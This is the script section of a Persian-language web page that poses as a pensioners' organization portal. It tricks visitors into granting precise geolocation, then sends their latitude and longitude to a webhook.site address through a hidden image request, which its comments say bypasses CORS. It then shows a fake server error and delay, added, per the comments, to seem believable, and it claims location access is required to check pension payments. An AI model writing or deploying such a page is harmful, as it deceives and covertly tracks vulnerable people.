    <script>
    function getLocation() {
        if (navigator.geolocation) {
            // تغییر وضعیت دکمه برای حس واقعی‌تر
            var btn = document.querySelector(".btn");
            btn.disabled = true;
            btn.innerHTML = "در حال بررسی...";

            navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            alert("مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.");
        }
    }

    function sendPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var webhookUrl = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
        
        // ارسال داده‌ها از طریق یک Image Request برای دور زدن کامل CORS
        // این روش باعث می‌شود مرورگر درخواست را بفرستد اما چون انتظار پاسخ (Response) ندارد، خطا نمی‌گیرد
        var dataUrl = webhookUrl + "?lat=" + lat + "&lon=" + lon;
        var img = new Image();
        img.src = dataUrl;

        // شبیه‌سازی تأخیر شبکه برای باورپذیر بودن
        setTimeout(function() {
            alert("خطای سیستمی (500): ارتباط با سرور سازمان بازنشستگان برقرار نشد. لطفاً ۵ دقیقه دیگر تلاش کنید.");
            
            // بازگرداندن دکمه به حالت اول
            var btn = document.querySelector(".btn");
            btn.disabled = false;
            btn.innerHTML = "تأیید منطقه سکونت و ورود";
        }, 1500);
    }

    function showError(error) {
        var msg = "";
        switch(error.code) {
            case error.PERMISSION_DENIED:
                msg = "دسترسی به مکان توسط شما رد شد. برای بررسی حقوق، اجازه دسترسی الزامی است.";
                break;
            case error.POSITION_UNAVAILABLE:
                msg = "موقعیت مکانی در دسترس نیست.";
                break;
            case error.TIMEOUT:
                msg = "زمان درخواست به پایان رسید.";
                break;
            default:
                msg = "یک خطای ناشناخته رخ داد.";
        }
        alert(msg);
        var btn = document.querySelector(".btn");
        btn.disabled = false;
        btn.innerHTML = "تأیید منطقه سکونت و ورود";
    }
    </script>
</body>
</html>
